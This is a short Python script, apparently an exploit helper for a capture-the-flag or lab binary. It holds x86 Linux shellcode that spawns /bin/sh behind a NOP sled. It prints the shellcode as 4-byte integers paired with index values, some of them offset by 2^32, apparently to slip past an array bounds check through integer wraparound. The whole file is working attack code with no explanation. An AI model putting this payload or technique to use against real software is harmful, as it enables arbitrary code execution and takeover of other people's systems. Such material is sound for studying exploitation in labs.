
def main():
    shellcode = b'\x90'*17 + b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
    zero = 4294967296
    i = 1
    j = 0
    while i - 1 < len(shellcode):
        if i % 4 == 0 :
            print(int.from_bytes(shellcode[i - 1 : i + 3], byteorder='little', signed=False))
            if j % 3 == 0:
                print(zero + j)
            else:
                print(j)
            print("------------")
            j+=1
        i+=1



    

if __name__ == "__main__":
    main()